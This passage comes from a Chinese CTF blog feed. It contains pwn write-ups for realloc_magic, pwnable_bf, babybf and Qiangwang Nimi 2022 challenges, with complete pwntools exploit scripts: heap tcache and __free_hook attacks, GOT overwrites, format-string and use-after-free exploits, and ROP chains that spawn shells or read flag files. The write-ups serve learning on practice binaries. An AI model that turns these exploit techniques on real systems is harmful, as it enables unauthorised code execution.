class="hljs-string">&#x27;little&#x27;</span>, signed=<span class="hljs-literal">True</span>)<br>    result = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(l):<br>        t = gadget &amp; <span class="hljs-number">0xffffffff</span><br>        result += p32(<span class="hljs-number">9</span>) + p32(t) + p32(<span class="hljs-number">0xd</span>) + p32(<span class="hljs-number">0x7d6</span> + i)<br>        gadget = gadget &gt;&gt; <span class="hljs-number">32</span><br>    <span class="hljs-keyword">return</span> result<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;choice :&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>code = p32(<span class="hljs-number">11</span>) + p32(<span class="hljs-number">0x7d4</span>) + p32(<span class="hljs-number">11</span>) + p32(<span class="hljs-number">0x7d5</span>) + p32(<span class="hljs-number">11</span>) + p32(<span class="hljs-number">0x7d6</span> + <span class="hljs-number">8</span>) + p32(<span class="hljs-number">11</span>) + p32(<span class="hljs-number">0x7d7</span> + <span class="hljs-number">8</span>)<br>code += p32(<span class="hljs-number">0xe</span>) * <span class="hljs-number">4</span><br>p.sendafter(<span class="hljs-string">b&#x27;code:&#x27;</span>, code)<br>p.sendlineafter(<span class="hljs-string">b&#x27;choice :&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br><br>leak1 =  <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>), <span class="hljs-number">16</span>) &lt;&lt; <span class="hljs-number">32</span><br>leak2 = leak1 + <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>), <span class="hljs-number">16</span>)<br>leak3 =  <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>), <span class="hljs-number">16</span>) &lt;&lt; <span class="hljs-number">32</span><br>stack = leak3 + <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>), <span class="hljs-number">16</span>)<br>libcbase = leak2  - <span class="hljs-number">240</span> - libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>pop_rdi = libcbase + <span class="hljs-number">0x21112</span><br>pop_rsi = libcbase + <span class="hljs-number">0x202f8</span><br>pop_rdx = libcbase + <span class="hljs-number">0x1b92</span><br>pop_rax = libcbase + <span class="hljs-number">0x3a738</span> <br>ret = libcbase + <span class="hljs-number">0x937</span><br>syscall_ret = libcbase + <span class="hljs-number">0xbc3f5</span><br><br><br>p.sendlineafter(<span class="hljs-string">b&#x27;choice :&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>payload = flat(<br>    p64(pop_rdi), p64(stack + <span class="hljs-number">0xb0</span>),<br>    p64(pop_rsi), p64(<span class="hljs-number">0</span>),<br>    p64(pop_rax), p64(<span class="hljs-number">2</span>),<br>    p64(syscall_ret),<br><br>    p64(pop_rdi), p64(<span class="hljs-number">3</span>),<br>    p64(pop_rsi), p64(stack + <span class="hljs-number">0x100</span>),<br>    p64(pop_rdx), p64(<span class="hljs-number">0x30</span>),<br>    p64(pop_rax), p64(<span class="hljs-number">0</span>),<br>    p64(syscall_ret),<br><br>    p64(pop_rdi), p64(<span class="hljs-number">1</span>),<br>    p64(pop_rsi), p64(stack + <span class="hljs-number">0x100</span>),<br>    p64(pop_rdx), p64(<span class="hljs-number">0x30</span>),<br>    p64(pop_rax), p64(<span class="hljs-number">1</span>),<br>    p64(syscall_ret)<br>)<br>payload += <span class="hljs-string">b&#x27;flag&#x27;</span><br>code = sendgadget(payload)<br>p.sendafter(<span class="hljs-string">b&#x27;code:&#x27;</span>, code)<br>p.sendlineafter(<span class="hljs-string">b&#x27;choice :&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="roarctf-2019-realloc-magic"><a href="#roarctf-2019-realloc-magic" class="headerlink" title="roarctf_2019_realloc_magic"></a>roarctf_2019_realloc_magic</h3><p>Roderick师傅的<a href="https://roderickchan.github.io/2021/03/28/roarctf-2019-realloc-magic/">这篇</a>已经写得很好了，还需要注意的是使用realloc函数，在扩大内存时，并且tcache中正好有该大小的chunk，这时也并不会去使用tcache中的chunk。</p><p>​                         </p><p>自己复现的exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;roarctf_2019_realloc_magic&#x27;</span>)<br>libc = elf.libc<br><span class="hljs-comment">#p = process(&#x27;./roarctf_2019_realloc_magic&#x27;)</span><br><span class="hljs-keyword">global</span> p<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">realloc</span>(<span class="hljs-params">size, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size?&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br>    <span class="hljs-keyword">if</span> size != <span class="hljs-number">0</span>:<br>        p.sendafter(<span class="hljs-string">b&#x27;Content?&#x27;</span>, content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br>    realloc(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    realloc(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    realloc(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    realloc(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        free()<br>    realloc(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    realloc(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    realloc(<span class="hljs-number">0x40</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x20</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x81</span>) + <span class="hljs-string">b&#x27;\x60\xc7&#x27;</span>)<br>    realloc(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    realloc(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    realloc(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    realloc(<span class="hljs-number">0x80</span>, p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    leak =  u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>, timeout=<span class="hljs-number">1</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    libcbase = leak - <span class="hljs-number">4118704</span><br>    free_hook = libcbase + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>    onegadget = libcbase + <span class="hljs-number">0x4f322</span><br><br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;666&#x27;</span>)<br>    realloc(<span class="hljs-number">0x30</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    realloc(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    realloc(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    realloc(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>):<br>        free()<br>    realloc(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    realloc(<span class="hljs-number">0x30</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    realloc(<span class="hljs-number">0x50</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x30</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x81</span>) + p64(free_hook))<br>    realloc(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    realloc(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    realloc(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    realloc(<span class="hljs-number">0x80</span>, p64(onegadget))<br>    free()<br>    p.interactive()<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">try</span> :<br>        p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28369</span>)<br>        pwn()<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        p.close()<br></code></pre></td></tr></table></figure><p>​                                                 </p><p>​                                            </p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>bf解释器</title>
    <link href="/2022/12/12/bf%E8%A7%A3%E9%87%8A%E5%99%A8/"/>
    <url>/2022/12/12/bf%E8%A7%A3%E9%87%8A%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<p>最近在强网拟态和安洵杯上都出现了bf解释器的题，自己还是头一回见，在此学习一下。</p><p>Brainfuck，简称BF，是一种极小化的程序语言</p><img src="/img/7/Screenshot_20221230_014458.png" style="zoom: 67%;" /><h3 id="pwnable-bf"><a href="#pwnable-bf" class="headerlink" title="pwnable_bf"></a>pwnable_bf</h3><p>首先看一道pwnable_bf（buu和pwnable.kr上都有）</p><p>其主函数中全局变量p指向全局变量tape的地址，输入一段字符后就让每个字符进入do_brainfuck函数：</p><img src="/img/7/Screenshot_20221230_014948.png" style="zoom: 80%;" /><p>​                                  </p><p>在do_brainfuck函数中就是对指针p的操作，每一个字符实际上就对应了bf解释器的操作；漏洞也很明显，就是指针p对应tape的地址的变化没有做出限制，这就让指针p指向got表：</p><img src="/img/7/Screenshot_20221230_015016.png" style="zoom: 80%;" /><p>​                                                        </p><p>泄漏地址libc地址后可以继续使用的就只有putchar函数和getchar函数，由于对got表的读写都只能是一字节，getchar函数对自己的got表修改到一半就会先失效，所以只能修改putchar函数的got表；而putchar函数的参数只能是一个字节，无法完成”&#x2F;bin&#x2F;sh”的调用，所以修改putchar函数为_start、memset函数为gets函数、fgets函数为system函数即可。</p><p>完整的exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;bf&#x27;</span>)<br><span class="hljs-comment">#libc = elf.libc</span><br>libc = ELF(<span class="hljs-string">&#x27;libc-2.23.so&#x27;</span>)<br><span class="hljs-comment">#p = process(&#x27;./bf&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">25595</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getchar</span>(<span class="hljs-params">gadget</span>):<br>    l = <span class="hljs-built_in">len</span>(gadget)<br>    gadget = <span class="hljs-built_in">int</span>.from_bytes(gadget, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>, signed=<span class="hljs-literal">True</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(l):<br>        t = gadget &amp; <span class="hljs-number">0xff</span><br>        gadget = gadget &gt;&gt; <span class="hljs-number">8</span><br>        p.send(p8(t))<br><br>payload = <span class="hljs-string">b&#x27;&lt;&#x27;</span> * <span class="hljs-number">0x7c</span>  + <span class="hljs-string">b&#x27;.&gt;&#x27;</span> * <span class="hljs-number">4</span>  <span class="hljs-comment">#泄漏__libc_start_main的地址</span><br>payload += <span class="hljs-string">b&#x27;&lt;&#x27;</span> * <span class="hljs-number">24</span> + <span class="hljs-string">b&#x27;,&gt;&#x27;</span> * <span class="hljs-number">4</span> <span class="hljs-comment">#修改fgets函数的地址</span><br>payload += <span class="hljs-string">b&#x27;&gt;&#x27;</span> * <span class="hljs-number">24</span> + <span class="hljs-string">b&#x27;,&gt;&#x27;</span> * <span class="hljs-number">8</span><span class="hljs-comment">#修改memset函数和putchar函数</span><br>payload += <span class="hljs-string">b&#x27;.&#x27;</span><span class="hljs-comment">#调用putchar函数</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;[ ]&#x27;</span>, payload)<br>leak = u32(p.recvuntil(<span class="hljs-string">b&#x27;\xf7&#x27;</span>)[-<span class="hljs-number">4</span>:])<br><br>libcbase = leak - libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>sys_addr = libcbase + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>gets = libcbase + libc.sym[<span class="hljs-string">&#x27;gets&#x27;</span>]<br><br>getchar(p32(sys_addr))<br>getchar(p32(gets))<br>getchar(p32(<span class="hljs-number">0x80484e0</span>))<br><br>p.sendline(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="安洵杯babybf"><a href="#安洵杯babybf" class="headerlink" title="安洵杯babybf"></a>安洵杯babybf</h3><p>本地环境：2.27-3ubuntu1.6_amd64</p><p>安洵杯的这道题很抽象</p><h4 id="v3数组"><a href="#v3数组" class="headerlink" title="v3数组"></a>v3数组</h4><p>函数sub_142F的开头就是一些函数赋值给v3数组，这些函数直接去看是完全不知道其意义，所以边调试边去阅读可以很好得帮助理解。</p><p>函数栈的排布如下：</p><img src="/img/7/Screenshot_20221230_032525.jpg" style="zoom: 67%;" /><p>​                                                                                        </p><p>这里以函数sub_16F6为例子</p><img src="/img/7/Screenshot_20221230_040603.png" style="zoom: 67%;" /><ol><li><p>rbp-0A8中的值(0x7ffc6a1b48d0)加1</p></li><li><p>rbp-0B0中的值(0x562b3853e261)加1</p></li><li><p>eax赋上地址0x562b3853e261中的值(1字节) </p></li><li><p>mov  rax, [rbp+rax*8-80h]   （rax赋上v3数组的函数地址，rax  &#x3D;  v3[rax]）</p></li><li><p>jmp     rax</p></li></ol><p>再对照函数sub_16F6伪代码就可以知道函数的作用了</p><p><img src="/img/7/Screenshot_20221230_042441.png"></p><p>​                              </p><p>实际上<code>rbp-0A8</code>就是bf解释器的指针，<code>rbp-0B0</code>中储存着下一指令，所以这些函数作用如下：</p> <img src="/img/7/Screenshot_20221230_043330.png" style="zoom:80%;" /><h4 id="字符转化"><a href="#字符转化" class="headerlink" title="字符转化"></a>字符转化</h4><p>这道题并没有直接给你<code>&quot;&gt;  &lt;  ,  .&quot;</code> 这些字符，而是在你输入一段字符后，又去使用dword_2020数组进行一步转化</p><img src="/img/7/Screenshot_20221230_034137.png" style="zoom: 80%;" /><p>dword_2020数组部分内容如下：</p><img src="/img/7/Screenshot_20221230_032203.jpg" style="zoom:67%;" /><p>​                                                                                           </p><p>规律如下：[输入的值(ascii码)&#x3D;&gt;转化后的值]</p><p><code>[0=&gt;8][1=&gt;9][43=&gt;2][44=&gt;5][45=&gt;3][46=&gt;4][60=&gt;0][62=&gt;1][91=&gt;6][93=&gt;7]</code></p><p>输入的值是字符，在内存中以ascii码储存，转化后的值又是对应v3数组中的引索。</p><p>例如字符<code>&#39;&gt;&#39;</code>的ascii码为62，转化后的值为1，最后对应v3[1]中函数的执行。</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>虽然这道题不像pwnable_bf中很直接给出bf解释器的操作，但是经过一系列转化后也同样达到了bf解释器的效果。</p><p>操作的指针是<code>rbp-0A8</code>，其里面的值也是栈上的值，也就是可以对栈上任意值读写，所以泄漏__libc_start_main函数地址后直接ROP</p><p>完整exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;chall&#x27;</span>)<br>libc = elf.libc<br>p = process(<span class="hljs-string">&#x27;./chall&#x27;</span>)<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getchar</span>(<span class="hljs-params">gadget</span>):<br>    l = <span class="hljs-built_in">len</span>(gadget)<br>    gadget = <span class="hljs-built_in">int</span>.from_bytes(gadget, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>, signed=<span class="hljs-literal">True</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(l):<br>        t = gadget &amp; <span class="hljs-number">0xff</span><br>        gadget = gadget &gt;&gt; <span class="hljs-number">8</span><br>        p.send(p8(t))<br><br><span class="hljs-comment">#s = [0,8][1,9][43,2][44,5][45,3][46,4][60,0][62,1][91,6][93,7]</span><br><br>p.sendlineafter(<span class="hljs-string">b&#x27;len&gt;&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">0x100</span>).encode())<br>payload = <span class="hljs-string">b&#x27;&gt;&#x27;</span> * <span class="hljs-number">0x58</span> + (<span class="hljs-string">b&#x27;.&#x27;</span> + <span class="hljs-string">b&#x27;&gt;&#x27;</span>) * <span class="hljs-number">8</span> + <span class="hljs-string">b&#x27;&lt;&#x27;</span> * <span class="hljs-number">0x28</span> + (<span class="hljs-string">b&#x27;,&#x27;</span> + <span class="hljs-string">b&#x27;&gt;&#x27;</span>) * <span class="hljs-number">0x20</span><br>p.sendafter(<span class="hljs-string">b&#x27;code&gt;&#x27;</span>, payload)<br>leak =  u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcbase = leak - <span class="hljs-number">231</span> - libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>sys_addr = libcbase + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh = libcbase + libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>).__next__()<br>pop_rdi = libcbase + <span class="hljs-number">0x2164f</span><br>ret = libcbase + <span class="hljs-number">0x8aa</span><br><br>payload = p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(sys_addr)<br>getchar(payload)<br><span class="hljs-comment">#pause()</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="强网拟态bfbf"><a href="#强网拟态bfbf" class="headerlink" title="强网拟态bfbf"></a>强网拟态bfbf</h3><p><a href="https://xtxtn.github.io/2022/11/19/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812022/#bfbf">强网拟态2022pwn - xtxtn’s Blog</a></p><p>​                            </p><p>​                       </p><p>​                  </p><p>参考：<a href="https://zh.wikipedia.org/wiki/Brainfuck">Brainfuck - 维基百科，自由的百科全书 (wikipedia.org)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>强网拟态2022pwn</title>
    <link href="/2022/11/19/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812022/"/>
    <url>/2022/11/19/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812022/</url>
    
    <content type="html"><![CDATA[<h3 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h3><p>直接利用格式化字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;pwn1&#x27;</span>)<br>p = process(<span class="hljs-string">&#x27;./pwn1&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>elfbase = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>) - elf.sym[<span class="hljs-string">&#x27;func&#x27;</span>]<br><br>printf_got = elfbase + elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>system_plt = elfbase + elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>]<br>payload = fmtstr_payload(<span class="hljs-number">8</span>, &#123;printf_got:system_plt&#125;,write_size=<span class="hljs-string">&#x27;byte&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;2&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br>p.sendafter(<span class="hljs-string">b&#x27;hello\n&#x27;</span>, payload)<br><span class="hljs-comment">#pause()</span><br>p.send(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="pwn2-1"><a href="#pwn2-1" class="headerlink" title="pwn2-1"></a>pwn2-1</h3><p>存在uaf，且print_note函数是通过引用堆块上print_note_content函数的地址来实现，修改堆上print_note_content函数的地址为magic函数地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;pwn2-1&#x27;</span>)<br>p = process(<span class="hljs-string">&#x27;./pwn2-1&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;:&#x27;</span>, content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">printf</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;5&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>elfbase = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">0x11f0</span><br><br>add(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x10</span>, p64(elfbase + elf.sym[<span class="hljs-string">&#x27;magic&#x27;</span>]))<br>printf(<span class="hljs-number">0</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="bfbf"><a href="#bfbf" class="headerlink" title="bfbf"></a>bfbf</h3><p>bf解释器类型的题</p><p>通过输入的‘&gt;&lt;+-‘等这些符号可以对栈上v3的数据进行读写，而且没有对偏移量进行限制，这就可以对栈上的任意数据读写。</p><img src="/img/6/Screenshot_20221130_051449.png" style="zoom: 80%;" /><p>打印出<code>__libc_start_main</code>函数的地址，减去相应的偏移就可得到libc的基地址，利用libc找到相应的gadget，再覆盖栈上<code>__libc_start_main</code>的地址，直接ROP。</p><p>程序开启沙盒对read函数的第一个参数进行了限制，我们无法直接orw读取flag文件中的信息，这里改用sendfile函数即可。</p><img src="/img/6/Screenshot_20221130_053546.png" style="zoom: 80%;" /><p>​</p><p>完整exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 